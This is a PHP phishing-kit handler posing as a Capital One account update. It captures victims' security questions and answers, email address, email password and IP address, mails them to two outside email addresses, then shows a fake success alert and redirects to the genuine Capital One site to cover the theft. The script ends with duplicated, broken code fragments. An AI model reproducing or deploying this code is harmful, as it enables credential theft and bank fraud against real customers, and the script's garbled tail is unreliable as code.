<?php 

$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ capital ReZulT +--------------\n";
$message .= "Quest1 : ".$_POST['question1']."\n";
$message .= "Answer1 : ".$_POST['answer1']."\n";
$message .= "Quest2 : ".$_POST['question2']."\n";
$message .= "Answer2 : ".$_POST['answer2']."\n";
$message .= "Quest3 : ".$_POST['question3']."\n";
$message .= "Answer3 : ".$_POST['answer3']."\n";
$message .= "Quest4 : ".$_POST['question4']."\n";
$message .= "Answer4 : ".$_POST['answer4']."\n";
$message .= "Quest5 : ".$_POST['question5']."\n";
$message .= "Answer5 : ".$_POST['answer5']."\n";
$message .= "Quest6 : ".$_POST['question6']."\n";
$message .= "Answer6 : ".$_POST['answer6']."\n";
$message .= "Quest7 : ".$_POST['question7']."\n";
$message .= "Answer7 : ".$_POST['answer7']."\n";
$message .= "Email Address : ".$_POST['email']."\n";
$message .= "Email Password : ".$_POST['txtpassword']."\n";
$message .= "---------------Created By issaczx-----------------\n";
$message .= "IP: ".$ip."\n";
$recipient = "k_kinzo@yahoo.com,result.boxx@outlook.com";
$subject = "questions";
$headers = "From: \n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))

{
?>
	
		   <script language=javascript>
alert('Account update was successful - Thank you for using CapitalOne');
window.location='http://www.capitalone.com/';
</script>
<?

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>back and try again.";
  	   }

?>

?>